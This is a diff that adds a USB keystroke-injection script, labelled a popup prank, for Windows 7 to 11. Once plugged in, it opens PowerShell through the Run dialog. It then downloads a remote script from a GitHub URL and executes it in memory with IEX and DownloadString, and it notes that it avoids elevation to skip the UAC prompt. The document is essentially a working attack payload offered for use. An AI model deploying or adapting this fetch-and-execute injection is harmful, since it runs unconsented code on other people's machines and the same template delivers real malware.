@@ -1,0 +1,27 @@
+REM ======================================
+REM Title: PopUps Prank 
+REM Target: Windows 7/10/11
+REM Author: 3mrgnc3
+REM Description: Opens PowerShell and downloads/executes popup prank script from GitHub
+REM Credit to I Am Jakoby Origional Rage-PopUps Prank ;)
+REM Original script idea from: github.com/I-Am-Jakoby
+REM ======================================
+
+DUCKY_LANG UK
+DEFINE #HID_DELAY 1200
+
+REM Wait for system to be ready
+DELAY 2000
+
+REM Open PowerShell as user (not admin to avoid UAC)
+GUI r
+DELAY #HID_DELAY
+STRINGLN powershell
+DELAY #HID_DELAY
+
+REM Download and execute the popup script from GitHub in memory
+STRINGLN IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3mrgnc3/attiny85_ducky/main/ducky_scripts/examples/PopupsPrank/popup_looper.ps1')
+DELAY #HID_DELAY
+
+REM Exit PowerShell (script runs in background)
+STRINGLN exit
